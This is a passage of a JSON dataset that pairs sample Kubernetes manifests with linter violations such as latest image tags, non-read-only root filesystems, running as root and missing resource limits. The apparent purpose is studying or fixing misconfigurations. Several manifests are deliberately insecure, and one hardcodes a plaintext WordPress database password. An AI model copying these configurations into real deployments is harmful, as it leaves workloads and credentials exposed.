    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\n  labels:\n    appname: busybox\nspec:\n  containers:\n  - name: busybox\n    image: quay.io/vcppds7878/busybox:latest\n    imagePullPolicy: IfNotPresent\n    command:\n    - sh\n    - -c\n    - while true; do echo $(date) | tee -a /mnt/test/outfile; sync; sleep 1; done\n    volumeMounts:\n    - name: mypvc\n      mountPath: /mnt/test\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: busybox-pvc\n      readOnly: false\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox\" is using an invalid container image, \"quay.io/vcppds7878/busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03642",
    "manifest_path": "data/manifests/the_stack_sample/sample_1611.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\n  labels:\n    appname: busybox\nspec:\n  containers:\n  - name: busybox\n    image: quay.io/vcppds7878/busybox:latest\n    imagePullPolicy: IfNotPresent\n    command:\n    - sh\n    - -c\n    - while true; do echo $(date) | tee -a /mnt/test/outfile; sync; sleep 1; done\n    volumeMounts:\n    - name: mypvc\n      mountPath: /mnt/test\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: busybox-pvc\n      readOnly: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox\" does not have a read-only root file system"
  },
  {
    "id": "03643",
    "manifest_path": "data/manifests/the_stack_sample/sample_1611.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\n  labels:\n    appname: busybox\nspec:\n  containers:\n  - name: busybox\n    image: quay.io/vcppds7878/busybox:latest\n    imagePullPolicy: IfNotPresent\n    command:\n    - sh\n    - -c\n    - while true; do echo $(date) | tee -a /mnt/test/outfile; sync; sleep 1; done\n    volumeMounts:\n    - name: mypvc\n      mountPath: /mnt/test\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: busybox-pvc\n      readOnly: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox\" is not set to runAsNonRoot"
  },
  {
    "id": "03644",
    "manifest_path": "data/manifests/the_stack_sample/sample_1611.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\n  labels:\n    appname: busybox\nspec:\n  containers:\n  - name: busybox\n    image: quay.io/vcppds7878/busybox:latest\n    imagePullPolicy: IfNotPresent\n    command:\n    - sh\n    - -c\n    - while true; do echo $(date) | tee -a /mnt/test/outfile; sync; sleep 1; done\n    volumeMounts:\n    - name: mypvc\n      mountPath: /mnt/test\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: busybox-pvc\n      readOnly: false\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox\" has cpu request 0"
  },
  {
    "id": "03645",
    "manifest_path": "data/manifests/the_stack_sample/sample_1611.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\n  labels:\n    appname: busybox\nspec:\n  containers:\n  - name: busybox\n    image: quay.io/vcppds7878/busybox:latest\n    imagePullPolicy: IfNotPresent\n    command:\n    - sh\n    - -c\n    - while true; do echo $(date) | tee -a /mnt/test/outfile; sync; sleep 1; done\n    volumeMounts:\n    - name: mypvc\n      mountPath: /mnt/test\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: busybox-pvc\n      readOnly: false\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox\" has memory limit 0"
  },
  {
    "id": "03646",
    "manifest_path": "data/manifests/the_stack_sample/sample_1613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: regex:^3.10.*\n    flux.weave.works/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings benji!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "03647",
    "manifest_path": "data/manifests/the_stack_sample/sample_1613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: regex:^3.10.*\n    flux.weave.works/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings benji!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "03648",
    "manifest_path": "data/manifests/the_stack_sample/sample_1613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: regex:^3.10.*\n    flux.weave.works/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings benji!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "03649",
    "manifest_path": "data/manifests/the_stack_sample/sample_1613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: regex:^3.10.*\n    flux.weave.works/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings benji!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "03650",
    "manifest_path": "data/manifests/the_stack_sample/sample_1613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: regex:^3.10.*\n    flux.weave.works/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings benji!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "03651",
    "manifest_path": "data/manifests/the_stack_sample/sample_1613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    flux.weave.works/automated: 'true'\n    flux.weave.works/tag.init: regex:^3.10.*\n    flux.weave.works/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings benji!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "03652",
    "manifest_path": "data/manifests/the_stack_sample/sample_1616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: wp\n  labels:\n    app: wp\nspec:\n  containers:\n  - name: wp\n    image: wordpress:5.8.1\n    ports:\n    - containerPort: 80\n    env:\n    - name: WORDPRESS_DB_HOST\n      value: mysql\n    - name: WORDPRESS_DB_USER\n      value: eduwp\n    - name: WORDPRESS_DB_PASSWORD\n      value: Passw0rd!\n    - name: WORDPRESS_DB_NAME\n      value: wpdata\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wp\" does not have a read-only root file system"
  },
  {
    "id": "03653",
    "manifest_path": "data/manifests/the_stack_sample/sample_1616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: wp\n  labels:\n    app: wp\nspec:\n  containers:\n  - name: wp\n    image: wordpress:5.8.1\n    ports:\n    - containerPort: 80\n    env:\n    - name: WORDPRESS_DB_HOST\n      value: mysql\n    - name: WORDPRESS_DB_USER\n      value: eduwp\n    - name: WORDPRESS_DB_PASSWORD\n      value: Passw0rd!\n    - name: WORDPRESS_DB_NAME\n      value: wpdata\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wp\" is not set to runAsNonRoot"
  },
  {
    "id": "03654",
    "manifest_path": "data/manifests/the_stack_sample/sample_1616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: wp\n  labels:\n    app: wp\nspec:\n  containers:\n  - name: wp\n    image: wordpress:5.8.1\n    ports:\n    - containerPort: 80\n    env:\n    - name: WORDPRESS_DB_HOST\n      value: mysql\n    - name: WORDPRESS_DB_USER\n      value: eduwp\n    - name: WORDPRESS_DB_PASSWORD\n      value: Passw0rd!\n    - name: WORDPRESS_DB_NAME\n      value: wpdata\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wp\" has cpu request 0"
  },
  {
    "id": "03655",
    "manifest_path": "data/manifests/the_stack_sample/sample_1616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: wp\n  labels:\n    app: wp\nspec:\n  containers:\n  - name: wp\n    image: wordpress:5.8.1\n    ports:\n    - containerPort: 80\n    env:\n    - name: WORDPRESS_DB_HOST\n      value: mysql\n    - name: WORDPRESS_DB_USER\n      value: eduwp\n    - name: WORDPRESS_DB_PASSWORD\n      value: Passw0rd!\n    - name: WORDPRESS_DB_NAME\n      value: wpdata\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wp\" has memory limit 0"
  },
  {
    "id": "03656",
    "manifest_path": "data/manifests/the_stack_sample/sample_1617.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4440\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03657",
    "manifest_path": "data/manifests/the_stack_sample/sample_1617.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4440\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03658",
    "manifest_path": "data/manifests/the_stack_sample/sample_1617.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4440\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03659",
    "manifest_path": "data/manifests/the_stack_sample/sample_1617.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4440\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03660",
    "manifest_path": "data/manifests/the_stack_sample/sample_1617.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4440\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03661",
    "manifest_path": "data/manifests/the_stack_sample/sample_1623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\n    knative.dev/high-availability: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app: eventing-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/ping\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"eventing-controller\" is using an invalid container image, \"ko://knative.dev/eventing/cmd/controller\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03662",
    "manifest_path": "data/manifests/the_stack_sample/sample_1623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\n    knative.dev/high-availability: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app: eventing-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/ping\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"eventing-controller\" does not have a read-only root file system"
  },
  {
    "id": "03663",
    "manifest_path": "data/manifests/the_stack_sample/sample_1623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\n    knative.dev/high-availability: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app: eventing-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/ping\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"eventing-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "03664",
    "manifest_path": "data/manifests/the_stack_sample/sample_1623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\n    knative.dev/high-availability: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app: eventing-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/ping\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"eventing-controller\" has memory limit 0"
  },
  {
    "id": "03665",
    "manifest_path": "data/manifests/the_stack_sample/sample_1624.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.222\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gcactivities\" does not have a read-only root file system"
  },
  {
    "id": "03666",
    "manifest_path": "data/manifests/the_stack_sample/sample_1624.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.222\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gcactivities\" is not set to runAsNonRoot"
  },
  {
    "id": "03667",
    "manifest_path": "data/manifests/the_stack_sample/sample_1624.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.222\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"gcactivities\" has cpu request 0"
  },
  {
    "id": "03668",
    "manifest_path": "data/manifests/the_stack_sample/sample_1624.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: jx-gcactivities\n  annotations:\n    meta.helm.sh/release-name: jxboot-helmfile-resources\n  namespace: jx\n  labels:\n    gitops.jenkins-x.io/pipeline: namespaces\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: gcactivities\n          release: jxboot-helmfile-resources\n      spec:\n        serviceAccountName: jx-gcactivities\n        containers:\n        - name: gcactivities\n          command:\n          - jx\n          args:\n          - gitops\n          - gc\n          - activities\n          imagePullPolicy: IfNotPresent\n          image: ghcr.io/jenkins-x/jx-boot:3.2.222\n          env:\n          - name: JX_LOG_FORMAT\n            value: json\n          - name: JX_LOG_LEVEL\n            value: info\n          - name: PIPELINE_KIND\n            value: dummy\n          resources: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gcactivities\" has memory limit 0"
  },
  {
    "id": "03669",
    "manifest_path": "data/manifests/the_stack_sample/sample_1628.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: spring-petclinic\n  name: spring-petclinic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: spring-petclinic\n  template:\n    metadata:\n      labels:\n        app: spring-petclinic\n    spec:\n      containers:\n      - image: quay.io/deepaked/spring-petclinic:v0.0.14\n        imagePullPolicy: Always\n        name: spring-petclinic\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"spring-petclinic\" does not have a read-only root file system"
  },
  {
    "id": "03670",
    "manifest_path": "data/manifests/the_stack_sample/sample_1628.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: spring-petclinic\n  name: spring-petclinic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: spring-petclinic\n  template:\n    metadata:\n      labels:\n        app: spring-petclinic\n    spec:\n      containers:\n      - image: quay.io/deepaked/spring-petclinic:v0.0.14\n        imagePullPolicy: Always\n        name: spring-petclinic\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"spring-petclinic\" is not set to runAsNonRoot"
  },
  {
    "id": "03671",
    "manifest_path": "data/manifests/the_stack_sample/sample_1628.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: spring-petclinic\n  name: spring-petclinic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: spring-petclinic\n  template:\n    metadata:\n      labels:\n        app: spring-petclinic\n    spec:\n      containers:\n      - image: quay.io/deepaked/spring-petclinic:v0.0.14\n        imagePullPolicy: Always\n        name: spring-petclinic\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"spring-petclinic\" has cpu request 0"
  },
  {
    "id": "03672",
    "manifest_path": "data/manifests/the_stack_sample/sample_1628.yaml",
